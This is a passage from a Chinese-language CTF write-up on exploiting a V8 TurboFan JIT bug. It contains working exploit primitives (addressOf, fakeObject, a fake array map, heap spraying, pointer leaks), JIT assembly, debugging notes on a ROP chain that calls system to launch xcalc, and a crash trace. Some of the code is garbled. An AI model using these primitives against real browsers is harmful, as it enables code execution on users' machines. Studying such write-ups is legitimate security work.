    var arb_fixeddouble_arr = fakeObject(element_addr + 0x2c);
    // console.log(hex(element_addr + 0x2c));
    %DebugPrint(arb_fixeddouble_arr); //    {});
    }
    var spary_size = 0x201;
    var spary = new Array(spary_size);
    for (var i=0;i{o[0][0] = obj;});
       return u32f(addr) - 1;
    }
    function fakeObject(addr) {
       var fval = i2f64(addr + 1);
       let f = eval(`(x,y,val)=>{
         for(var i = 0; i {},(o)=>{},fval);
       }
       return f((o)=>{o[0][0] = {};},(o)=>{return o[0][0];},fval);
    }
    let arr = spary[spary_size-0x3];
    let arr_address = addressOf(arr);
    let proto_addr = addressOf(Array.prototype);
    %DebugPrint(arr);
    %DebugPrint(spary);
    //fake a FixedDoubleArray Map
    arr[0] = p64f(0x08042115,0x18040404);
    arr[1] = p64f(0x29000423,0x0a0007ff);
    arr[2] = p64f(proto_addr+1,0);
    //alert(arr_address.toString(16));
    let element_addr = arr_address + 0x14;
    let fake_element = element_addr+0x44;
    //fake a FixedDoubleArray
    arr[4] = p64f(0,element_addr+0x8+0x1);
    arr[5] = p64f(0x08042229,fake_element+1);
    arr[6] = p64f(0x7ffffffe,0);
    //fake a FixedDoubleArray's element
    arr[7] = p64f(0,0x08042ab1);
    arr[8] = p64f(0x7ffffffe,0);
    var arb_fixeddouble_arr = fakeObject(element_addr + 0x2c);
    //leak backing store
    backing_store_addr = u64f(arb_fixeddouble_arr[0x9]);
    heap_t_addr = u64f(arb_fixeddouble_arr[0xa])
    //alert(backing_store_addr.toString(16));
    //alert(heap_t_addr.toString(16));
    //leak compression ptr high byte
    compression_high_bytes = u32f(arb_fixeddouble_arr[0x20]);
    //alert(compression_high_bytes.toString(16));
    function addressOf_full(obj) {
       var addr = addressOf(obj);
       return (BigInt(compression_high_bytes)  
不存在check是怎样的
    0x2343000857de   1be  488b4dd8       REX.W movq rcx,[rbp-0x28]
    0x2343000857e2   1c2  448b4107       movl r8,[rcx+0x7] ;以DOUBLE_ELEMENTS的方式取数据
存在check
    0x286d000857bd   1bd  488b4dd8       REX.W movq rcx,[rbp-0x28]
    0x286d000857c1   1c1  41b8fd383008   movl r8,0x83038fd       ;; (compressed) object: 0x286d083038fd 
    0x286d000857c7   1c7  443941ff       cmpl [rcx-0x1],r8
    0x286d000857cb   1cb  0f859e010000   jnz 0x286d0008596f  
    0x286d000857d1   1d1  448b4107       movl r8,[rcx+0x7]
都是先从栈上取数据，之后给rcx，然后通过rcx取值
## 5 问题
###### 5.1 使用turbo的问题
不能正常的显示界面
尝试使用之前安装的命令
    npm i
    npm run-script build
出错
后来看7ov8师傅的blog说出现这样的问题是正常的
上面重新搭建之后，通过右击index.html 之后就可以正常使用了
###### 5.2 关于default分支何时进入
在源码中有这样的注释
对于所有unknow nodes，会进入到这里
而调用函数正是一个unknown节点
###### 5.3 计算器的问题，还有重定位bash
/usr/bin/xcalc
###### 5.4 div对象内存查看调试
测试发现div对象只出现在html中
可以使用alert的方法暂停一下解析，
attach的进程
这样vmmap泄露的地址才有值
调试一下rop_chain位置
首先我使用alert命令
然后通过控制台下断点
但是没有段下来
之后reload了一下，成功断下
程序依次执行rop_chain
执行system失败了（原因暂时没有调试），之后ret到了0
## 6 细节
##### 关于调试
打印优化代码
    -print-opt-code
在源码中下断点，下断点的位置要精确
关于trace-turbo
    --trace-turbo-path ../
设置文件的路径
关于打印优化代码
具体的优化函数
具体优化的代码（打印出来的就是）
通过特征快速定位优化代码中的关键部位
生成新的JIT代码以为着之前生成的JIT代码没有被触发，当函数调用次数大于opt优化次数时，后面调用opt都会使用最后的JIT代码，触发源代码中的patch。如果形成的JIT优化代码触发patch位置，同样会断下来
尽管我调用了很多次函数，但是我仍然可以在含有循环的js脚本中调试源码，因为只有在产生JIT代码的时候才会断在源码中
##### 关于turbolizer图
可以看到下图中有三个json文件
这是因为运行本js的时候总共优化了三次
而对于本题来说我想看的是第三个
##### 关于计算器
位置
/usr/bin/xcalc
##### 关于obj的输出
    var arb_fixeddouble_arr = fakeObject(element_addr + 0x2c);
    console.log(hex(element_addr + 0x2c));
    console.log(arb_fixeddouble_arr); [FastProperties]
     - prototype: 0x359b082cb5e9 
     - elements: 0x359b0815a6fd  [HOLEY_DOUBLE_ELEMENTS]
     - length: 1073741823
     - properties: 0x359b08042229  {
    #
    # Fatal error in ../../src/objects/heap-object.h, line 219
    # Check failed: !v8::internal::FLAG_enable_slow_asserts || (IsHeapObject()).
    #
    #
    #
    #FailureMessage Object: 0x7ffc880fcd80
    ==== C stack trace ===============================
        /  / /v8/out.gn/x64.debug/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x21) [0x7fca669e1411]
        /  / /v8/out.gn/x64.debug/libv8_libplatform.so(+0x5905a) [0x7fca6696505a]
        /  / /v8/out.gn/x64.debug/libv8_libbase.so(V8_Fatal(char const*, int, char const*, ...)+0x26f) [0x7fca669c8cbf]
        /  / /v8/out.gn/x64.debug/d8(v8::internal::HeapObject::HeapObject(unsigned long)+0x82) [0x5616c53ba582]
        /  / /v8/out.gn/x64.debug/libv8.so(v8::internal::TorqueGeneratedDescriptorArray::TorqueGeneratedDescriptorArray(unsigned long)+0x27) [0x7fca64b9f787]
        /  / /v8/out.gn/x64.debug/libv8.so(v8::internal::DescriptorArray::DescriptorArray(unsigned long)+0x20) [0x7fca64b9f720]
        /  / /v8/out.gn/x64.debug/libv8.so(v8::internal::TaggedField::load(v8::internal::IsolateRoot, v8::internal::HeapObject, int)+0x53) [0x7fca64b9f693]
        /  / /v8/out.gn/x64.debug/libv8.so(v8::internal::Map::instance_descriptors(v8::internal::IsolateRoot, v8::RelaxedLoadTag) const+0x3d) [0x7fca64b9f62d]
        /  / /v8/out.gn/x64.debug/libv8.so(v8::internal::Map::instance_descriptors(v8::RelaxedLoadTag) const+0x48) [0x7fca64b80018]
        /  / /v8/out.gn/x64.debug/libv8.so(v8::internal::JSObject::PrintProperties(std::__Cr::basic_ostream >&)+0x5d) [0x7fca64ee107d]
        /  / /v8/out.gn/x64.debug/libv8.so(+0x255b1a6) [0x7fca64ee51a6]
        /  / /v8/out.gn/x64.debug/libv8.so(v8::internal::JSArray::JSArrayPrint(std::__Cr::basic_ostream >&)+0x8f) [0x7fca64edcc4f]
        /  / /v8/out.gn/x64.debug/libv8.so(v8::internal::HeapObject::HeapObjectPrint(std::__Cr::basic_ostream >&)+0x1aaa) [0x7fca64ed4dca]
        /  / /v8/out.gn/x64.debug/libv8.so(v8::internal::Object::Print(std::__Cr::basic_ostream >&) const+0x100) [0x7fca64ed3310]
        /  / /v8/out.gn/x64.debug/libv8.so(+0x2f4a4a2) [0x7fca658d44a2]
        /  / /v8/out.gn/x64.debug/libv8.so(+0x2f2f5cd) [0x7fca658b95cd]
        /  / /v8/out.gn/x64.debug/libv8.so(v8::internal::Runtime_DebugPrint(int, unsigned long*, v8::internal::Isolate*)+0x128) [0x7fca658b9288]
        /  / /v8/out.gn/x64.debug/libv8.so(+0x1c8031a) [0x7fca6460a31a]
感觉这个时候应该使用release模式进行调试了
##### 一个gafgets
    xchg_rax_rsp  '0x48', '0x94'
## 7 参考
官方WP